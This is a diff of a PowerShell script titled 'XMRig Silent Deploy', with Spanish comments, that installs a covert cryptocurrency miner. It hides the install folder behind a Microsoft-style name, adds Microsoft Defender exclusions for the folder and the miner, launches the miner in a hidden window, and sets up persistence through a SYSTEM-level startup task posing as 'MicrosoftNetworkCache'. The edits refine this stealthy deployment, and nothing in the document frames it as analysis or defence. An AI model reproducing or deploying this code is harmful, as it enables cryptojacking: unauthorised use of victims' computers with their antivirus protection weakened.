@@ -1,11 +1,11 @@
-# XMRig Silent Deploy - FINAL ULTRA FIXED (direct exe + env var native)
+# XMRig Silent Deploy - FINAL ULTRA FIXED (full path + no bat)
 $InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
 if (-not (Test-Path $InstallDir)) {
     New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
     (Get-Item $InstallDir).Attributes += "Hidden"
 }
 
-# Limpiar tarea antigua por si acaso
+# Limpiar tarea antigua
 $TaskName = "MicrosoftNetworkCache"
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
@@ -21,8 +21,8 @@ if ($Sub) {
     Remove-Item $Sub.FullName -Recurse -Force
 }
 
+$ExePath = "$InstallDir\xmrig.exe"
 $ConfigPath = "$InstallDir\config.json"
-$BatPath = "$InstallDir\start.bat"
 
 $ConfigJson = @"
 {
@@ -37,28 +37,21 @@ $ConfigJson = @"
     "pass": "x",
     "keepalive": true,
     "tls": true,
-    "rig-id": "`${COMPUTERNAME}"
+    "rig-id": "$($env:COMPUTERNAME)"
   }]
 }
 "@
 [System.IO.File]::WriteAllText($ConfigPath, $ConfigJson, [System.Text.Encoding]::UTF8)
 
-$BatContent = @"
-@echo off
-cd /d "%~dp0"
-xmrig.exe -c config.json -B --no-color
-"@
-$BatContent | Out-File $BatPath -Encoding ASCII -Force
-
 # Exclusiones Defender
 try { Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue } catch {}
-try { Add-MpPreference -ExclusionProcess "$InstallDir\xmrig.exe" -ErrorAction SilentlyContinue } catch {}
+try { Add-MpPreference -ExclusionProcess $ExePath -ErrorAction SilentlyContinue } catch {}
 
-# Lanzamiento inmediato
-Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$BatPath`"" -WindowStyle Hidden -WorkingDirectory $InstallDir
+# Lanzamiento inmediato (visible solo en tasklist)
+Start-Process -FilePath $ExePath -ArgumentList "-c `"$ConfigPath`" -B --no-color" -WindowStyle Hidden -WorkingDirectory $InstallDir
 
-# Persistencia (tarea + registry)
-$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c cd /d `"$InstallDir`" && xmrig.exe -c config.json -B --no-color"
+# Persistencia como SYSTEM
+$Action = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 try {
     $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
@@ -66,7 +59,6 @@ try {
 } catch {
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
 }
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "cmd.exe /c cd /d `"$InstallDir`" && xmrig.exe -c config.json -B --no-color" -Force
 
 # Forzar arranque ahora
 schtasks /run /tn $TaskName | Out-Null
